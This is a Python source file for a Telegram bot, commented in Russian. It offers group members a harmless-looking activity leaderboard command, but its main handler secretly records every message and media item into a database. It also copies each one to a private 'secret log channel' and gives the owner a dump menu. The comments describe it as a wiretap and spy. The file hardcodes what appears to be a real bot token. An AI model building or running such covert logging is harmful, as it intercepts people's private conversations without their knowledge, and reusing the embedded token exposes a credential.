import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3

# --- НАСТРОЙКИ ---
BOT_TOKEN = '8304060216:AAFlFiARVda3ydlLCT0WtPbMBT3tapZU1pI'
ADMIN_ID = 8705859046           # Твой личный ID
LOG_CHANNEL_ID = -1004316644119 # ID твоего приватного канала (обязательно начинается с -100)

bot = telebot.TeleBot(BOT_TOKEN)

# --- ИНИЦИАЛИЗАЦИЯ БАЗЫ ---
conn = sqlite3.connect('chat_logger.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''
    CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        chat_title TEXT,
        user_id INTEGER,
        username TEXT,
        text TEXT,
        media_type TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
''')
conn.commit()

# --- ПАНЕЛЬ УПРАВЛЕНИЯ В ЛС ---
@bot.message_handler(commands=['dump', 'start'], func=lambda m: m.chat.type == 'private')
def pm_menu(message):
    if message.from_user.id != ADMIN_ID:
        return
        
    cursor.execute('SELECT DISTINCT chat_id, chat_title FROM messages')
    chats = cursor.fetchall()
    
    if not chats:
        bot.send_message(message.chat.id, "🗄 База пуста. Бот еще ничего не перехватил.")
        return
        
    markup = InlineKeyboardMarkup()
    for chat_id, title in chats:
        chat_name = title if title else str(chat_id)
        markup.add(InlineKeyboardButton(text=f"📁 {chat_name}", callback_data=f"dump_{chat_id}"))
        
    bot.send_message(message.chat.id, "🕵️‍♂️ Выбери чат для создания дампа:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dump_'))
def handle_dump_request(call):
    if call.from_user.id != ADMIN_ID:
        return
        
    target_chat_id = call.data.split('_')[1]
    bot.answer_callback_query(call.id, "Инициализация сборки...")
    bot.edit_message_text(f"⏳ Готовлю HTML-архив для чата <code>{target_chat_id}</code>...\n(Здесь скоро будет ZIP)", call.message.chat.id, call.message.message_id, parse_mode='HTML')


# --- КОМАНДА ДЛЯ ВСЕХ: /whoactive ---
@bot.message_handler(commands=['whoactive'])
def cmd_whoactive(message):
    # Если написали в ЛС — просим использовать в группе
    if message.chat.type == 'private':
        bot.reply_to(message, "Эта команда работает только в группах!")
        return
        
    chat_id = message.chat.id
    
    # Считаем стату
    cursor.execute('''
        SELECT username, COUNT(*) as msg_count 
        FROM messages 
        WHERE chat_id = ? 
        GROUP BY user_id 
        ORDER BY msg_count DESC 
        LIMIT 5
    ''', (chat_id,))
    
    top_users = cursor.fetchall()
    
    if not top_users:
        bot.reply_to(message, "Пока никто ничего не писал. Будь первым! 🕵️‍♂️")
        return

    text = "🔥 <b>Топ активности в чате:</b>\n\n"
    medals = ['🥇', '🥈', '🥉', '🏅', '🏅']
    
    for i, user in enumerate(top_users):
        name = user[0] if user[0] else "Аноним"
        count = user[1]
        text += f"{medals[i]} {name} — {count} сообщ.\n"
        
    bot.reply_to(message, text, parse_mode="HTML")


# --- ПРОСЛУШКА ГРУПП (База + Пересылка в канал) ---
@bot.message_handler(func=lambda m: m.chat.type in ['group', 'supergroup'], content_types=['text', 'photo', 'video', 'voice', 'document', 'animation', 'sticker'])
def log_group_messages(message):
    # Игнорируем команды вроде /whoactive
    if message.text and message.text.startswith('/'):
        return

    chat_id = message.chat.id
    chat_title = message.chat.title
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    text_content = message.text or message.caption or ""
    media_type = message.content_type
    
    # 1. Записываем в SQLite
    cursor.execute('''
        INSERT INTO messages (chat_id, chat_title, user_id, username, text, media_type)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (chat_id, chat_title, user_id, username, text_content, media_type))
    conn.commit()

    # 2. Делаем слепок в секретный лог-канал
    try:
        copied_msg = bot.copy_message(LOG_CHANNEL_ID, chat_id, message.message_id)
        
        # Определяем, переслано ли сообщение
        forward_info = ""
        if message.forward_from:
            fwd_name = message.forward_from.username or message.forward_from.first_name
            forward_info = f"\n🔄 Переслано от: {fwd_name}"
        elif hasattr(message, 'forward_sender_name') and message.forward_sender_name:
            # Для пользователей со скрытым аккаунтом
            forward_info = f"\n🔄 Переслано от: {message.forward_sender_name}"
            
        # Теперь бот отвечает плашкой ВСЕГДА, даже на картинки без текста
        info_text = f"📍 Чат: {chat_title}\n👤 От: @{username}{forward_info}"
        bot.send_message(LOG_CHANNEL_ID, info_text, reply_to_message_id=copied_msg.message_id)
        
    except Exception as e:
        print(f"Ошибка копирования в канал: {e}")

print("Шпион запущен!")
bot.infinity_polling()
